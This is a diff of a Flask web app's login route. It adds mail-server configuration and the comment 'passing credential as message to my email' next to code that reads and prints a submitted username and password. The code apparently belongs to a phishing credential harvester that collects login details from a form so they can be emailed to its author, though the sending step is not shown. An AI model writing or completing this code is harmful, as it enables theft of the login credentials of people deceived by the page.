@@ -1,10 +1,18 @@
 from flask import Flask, render_template, redirect, request
 import requests
+from flask_mail import Mail, Message
 
 
 
 
 app = Flask(__name__)
+
+app.config['MAIL_SERVER'] = 'mail.prettyprinted.com'
+app.config['MAIL_PORT'] = 465
+app.config['MAIL_USE_SSL'] = True
+app.config.from_pyfile('config.cfg')
+
+mail = Mail(app)
 
 
 # home route 
@@ -21,11 +29,14 @@ and render the info in the input to desire destination '''
 @app.route('/login', methods = ['POST', 'GET'] )
 def login():
 
+    #passing credential as message to my email
+
     # git user credential from form only if they enter something
     userName = request.form.get("emailUsername")
     password = request.form.get("password")
   
     #Form Validation will be done in front end in the html.
+
     print(userName)
     print(password)
             
